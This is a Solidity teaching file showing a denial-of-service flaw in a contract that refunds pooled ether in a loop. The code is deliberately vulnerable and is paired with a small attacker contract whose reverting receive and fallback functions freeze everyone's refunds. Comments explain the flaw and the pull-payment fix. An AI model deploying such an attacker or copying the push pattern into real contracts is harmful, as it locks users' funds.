// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract MishandlingOfEth {
    address[] public entrants;
    uint256 public constant AMOUNT = 1 ether;

    // Silly contract that allows people to pool their money
    // And the contract will send everyone's money back at some point
    function enter() public payable {
        if (msg.value == AMOUNT) {
            entrants.push(msg.sender);
        }
    }
    // Many people can send their eth to this contract

    function sendBack() public {
        for (uint256 i = 0; i < entrants.length; i++) {
            (bool success,) = payable(entrants[i]).call{value: AMOUNT}("");
            require(success);
        }
        delete entrants;
    }
    // After a while, this contract will return all the eth back to the owners
    // since it is returning the eth back to every user one by one
    // If there is malicious actor entered the contract
    // and while sending back the eth, that particular contract has no `receive` or `fallback`
    // or has `revert` inside receive` or `fallback`
    // this function will revert and no one will get the ether back
    // Causing Denial Of Service(DOS)

    // Mitigation
    // Instead of this contract sending back the ether
    // create a withdraw function, where the users can withdraw their eth
    // This method is called `PUSH` over `PULL`
    // when this contract sends eth it is called `PUSH` method
    // If the user withdraw eth using `withdraw` it is called `PULL` method
}

contract MishandlingOfEthAttacker {
    MishandlingOfEth mishandlingOfEth;

    constructor(MishandlingOfEth _mishandlingOfEth) {
        mishandlingOfEth = _mishandlingOfEth;
    }

    function attack() public payable {
        mishandlingOfEth.enter{value: 1 ether}();
    }

    receive() external payable {
        revert();
    }

    fallback() external payable {
        revert();
    }
}
